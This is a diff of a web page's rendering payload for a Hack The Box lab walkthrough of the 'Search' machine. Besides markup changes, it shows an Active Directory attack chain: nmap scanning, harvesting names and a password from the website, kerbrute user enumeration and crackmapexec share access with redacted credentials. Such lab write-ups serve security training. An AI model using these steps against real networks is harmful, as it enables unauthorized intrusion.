@@ -1,20 +1,25 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Search Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A password exposed in a website image leads through Kerberoasting, password reuse, a protected workbook and client certificate to a domain shell, then GMSA password access and GenericAll allow Domain Admin takeover."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:07:39.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-search-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Search machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Search machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/search","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9","$La","$Lb"]]}],"$Lc"]}]]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$L11",null,{"headings":[{"id":"attack-chain","label":"Attack chain"},{"id":"2-initial-enumeration-reconnaissance","label":"2. Initial Enumeration: Reconnaissance"},{"id":"3-web-reconnaissance-the-art-of-looking-closely","label":"3. Web Reconnaissance: The Art of Looking Closely"},{"id":"4-username-enumeration-with-kerbrute","label":"4. Username Enumeration with Kerbrute"},{"id":"5-smb-enumeration-first-blood","label":"5. SMB Enumeration: First Blood"},{"id":"6-kerberoasting-harvesting-service-account-hashes","label":"6. Kerberoasting: Harvesting Service Account Hashes"},{"id":"7-password-reuse-the-weakest-link","label":"7. Password Reuse: The Weakest Link"},{"id":"8-excel-extraction-social-engineering-artifacts","label":"8. Excel Extraction: Social Engineering Artifacts"},{"id":"9-lateral-movement-to-sierra-frye","label":"9. Lateral Movement to Sierra.Frye"},{"id":"10-certificate-extraction-and-client-auth","label":"10. Certificate Extraction & Client Auth"},{"id":"11-bloodhound-mapping-the-domain","label":"11. BloodHound: Mapping the Domain"},{"id":"12-gmsa-abuse-the-hidden-service-account","label":"12. GMSA Abuse: The Hidden Service Account"},{"id":"13-domain-admin-via-genericall","label":"13. Domain Admin via GenericAll"},{"id":"14-capturing-the-root-flag","label":"14. Capturing the Root Flag"},{"id":"15-key-lessons-and-takeaways","label":"15. Key Lessons & Takeaways"},{"id":"full-command-reference","label":"Full Command Reference"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/286dbe321c28c8a189c50c015eee54a2eb6e7d2a/HTB-Search.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit 286dbe321c28",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Search, Windows, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/search","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"21 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-a:["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}]
-b:["$","div","technical-clarification-3",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Clarification: reusable Kerberos material and password-list values were removed. Community methods mentioned in the source were not individually cited, so this page does not claim independent reproduction of every path."}],null]}]
-12:T7a98,<p><strong>Machine:</strong> Search<br><strong>OS:</strong> Windows (Active Directory Domain Controller)<br><strong>Difficulty:</strong> Hard<br><strong>Target IP:</strong> <code>10.129.229.57</code><br><strong>Kali IP:</strong> <code>10.10.14.6</code><br><strong>Domain:</strong> <code>search.htb</code><br><strong>Flags:</strong></p>
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Search Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A password exposed in a website image leads through Kerberoasting, password reuse, a protected workbook and client certificate to a domain shell, then GMSA password access and GenericAll allow Domain Admin takeover."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],["$","strong",null,{"children":"Search"}],"$L5","$L6"]}],"$L7","$L8"],null,null]}]]}],"$L9"]}],"$La","$Lb"]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","small",null,{"children":"Hack The Box machine record"}]
+6:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/search","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+7:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Windows"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Hard"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+8:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+9:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-search-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Search machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Search machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/search","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+a:["$","div",null,{"className":"article-rule"}]
+b:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L10",null,{"headings":[{"id":"attack-chain","label":"Attack chain"},{"id":"2-initial-enumeration-reconnaissance","label":"2. Initial Enumeration: Reconnaissance"},{"id":"3-web-reconnaissance-the-art-of-looking-closely","label":"3. Web Reconnaissance: The Art of Looking Closely"},{"id":"4-username-enumeration-with-kerbrute","label":"4. Username Enumeration with Kerbrute"},{"id":"5-smb-enumeration-first-blood","label":"5. SMB Enumeration: First Blood"},{"id":"6-kerberoasting-harvesting-service-account-hashes","label":"6. Kerberoasting: Harvesting Service Account Hashes"},{"id":"7-password-reuse-the-weakest-link","label":"7. Password Reuse: The Weakest Link"},{"id":"8-excel-extraction-social-engineering-artifacts","label":"8. Excel Extraction: Social Engineering Artifacts"},{"id":"9-lateral-movement-to-sierra-frye","label":"9. Lateral Movement to Sierra.Frye"},{"id":"10-certificate-extraction-and-client-auth","label":"10. Certificate Extraction & Client Auth"},{"id":"11-bloodhound-mapping-the-domain","label":"11. BloodHound: Mapping the Domain"},{"id":"12-gmsa-abuse-the-hidden-service-account","label":"12. GMSA Abuse: The Hidden Service Account"},{"id":"13-domain-admin-via-genericall","label":"13. Domain Admin via GenericAll"},{"id":"14-capturing-the-root-flag","label":"14. Capturing the Root Flag"},{"id":"15-key-lessons-and-takeaways","label":"15. Key Lessons & Takeaways"},{"id":"full-command-reference","label":"Full Command Reference"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/286dbe321c28c8a189c50c015eee54a2eb6e7d2a/HTB-Search.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit 286dbe321c28",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Search, Windows, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/search","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"21 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}],["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}],"$L11"]]}],"$L12"]}]
+c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-sizzle-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Sizzle Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:09:45.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-seal-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Seal Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:06:37.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T56e,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/#article","headline":"Hack The Box: Search Walkthrough","description":"A password exposed in a website image leads through Kerberoasting, password reuse, a protected workbook and client certificate to a domain shell, then GMSA password access and GenericAll allow Domain Admin takeover.","url":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/","datePublished":"2026-06-11T16:07:39.000Z","dateModified":"2026-06-11T16:07:39.000Z","wordCount":2581,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/286dbe321c28c8a189c50c015eee54a2eb6e7d2a/HTB-Search.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-search-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Search Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+f:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+11:["$","div","technical-clarification-3",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Clarification: reusable Kerberos material and password-list values were removed. Community methods mentioned in the source were not individually cited, so this page does not claim independent reproduction of every path."}],null]}]
+18:T8189,<p><strong>Machine:</strong> Search<br><strong>OS:</strong> Windows (Active Directory Domain Controller)<br><strong>Difficulty:</strong> Hard<br><strong>Target IP:</strong> <code>10.129.229.57</code><br><strong>Kali IP:</strong> <code>10.10.14.6</code><br><strong>Domain:</strong> <code>search.htb</code><br><strong>Flags:</strong></p>
 <ul>
 <li>User: <code>44a56c[redacted]7f59b5a64b</code></li>
 <li>Root: <code>213fb79[redacted]9e29dd3b1</code></li>
@@ -49,7 +54,7 @@ b:["$","div","technical-clarification-3",{"className":"article-review-note artic
 <h2 id="2-initial-enumeration-reconnaissance">2. Initial Enumeration: Reconnaissance</h2>
 <h3 id="2-1-why-start-with-nmap">2.1 Why Start with Nmap?</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
 sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt
 </code></pre>
 <p><strong>What this does:</strong></p>
@@ -119,7 +124,7 @@ sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt
 </tbody></table>
 <p><strong>Critical Observation:</strong>
 The output shows:</p>
-<pre><code>Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
 Domain: search.htb
 </code></pre>
 <p>This tells us:</p>
@@ -135,7 +140,7 @@ Domain: search.htb
 <h2 id="3-web-reconnaissance-the-art-of-looking-closely">3. Web Reconnaissance: The Art of Looking Closely</h2>
 <h3 id="3-1-why-check-the-website-first">3.1 Why Check the Website First?</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -s http://search.htb | grep -ioE '[A-Za-z]+\.[A-Za-z]+@[a-z.]+\.htb|[A-Za-z]+ [A-Za-z]+' | sort -u &gt; names_raw.txt
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">curl -s http://search.htb | grep -ioE '[A-Za-z]+\.[A-Za-z]+@[a-z.]+\.htb|[A-Za-z]+ [A-Za-z]+' | sort -u &gt; names_raw.txt
 curl -s http://search.htb/images/slide_2.jpg -o slide_2.jpg
 file slide_2.jpg
 xdg-open slide_2.jpg
@@ -167,7 +172,7 @@ The website lists team members. One of them is <strong>Hope Sharp</strong>. The 
 <h2 id="4-username-enumeration-with-kerbrute">4. Username Enumeration with Kerbrute</h2>
 <h3 id="4-1-what-is-kerbrute">4.1 What is Kerbrute?</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">cat &gt; users.txt &lt;&lt; 'EOF'
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">cat &gt; users.txt &lt;&lt; 'EOF'
 Dax.Santiago
 Keely.Lyons
 Sierra.Frye
@@ -195,7 +200,7 @@ Kerbrute exploits a <strong>Kerberos protocol behavior</strong>: when you send a
 
 <h3 id="4-2-interpreting-results">4.2 Interpreting Results</h3>
 <p><strong>Output:</strong></p>
-<pre><code>[+] VALID USERNAME:  Sierra.Frye@search.htb
+<pre tabindex="0" aria-label="Code or terminal block 5"><code>[+] VALID USERNAME:  Sierra.Frye@search.htb
 [+] VALID USERNAME:  Keely.Lyons@search.htb
 [+] VALID USERNAME:  Dax.Santiago@search.htb
 [+] VALID USERNAME:  Hope.Sharp@search.htb
@@ -205,7 +210,7 @@ Kerbrute exploits a <strong>Kerberos protocol behavior</strong>: when you send a
 <h2 id="5-smb-enumeration-first-blood">5. SMB Enumeration: First Blood</h2>
 <h3 id="5-1-testing-the-found-credentials">5.1 Testing the Found Credentials</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Hope.Sharp -p REDACTED --shares
+<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Hope.Sharp -p REDACTED --shares
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
@@ -226,7 +231,7 @@ Kerbrute exploits a <strong>Kerberos protocol behavior</strong>: when you send a
 
 <h3 id="5-2-discovering-redirectedfolders">5.2 Discovering RedirectedFolders$</h3>
 <p><strong>Output:</strong></p>
-<pre><code>Share              Permissions     Remark
+<pre tabindex="0" aria-label="Code or terminal block 7"><code>Share              Permissions     Remark
 -----              -----------     ------
 ADMIN$                             Remote Admin
 C$                                 Default share
@@ -242,7 +247,7 @@ SYSVOL             READ            Logon server share
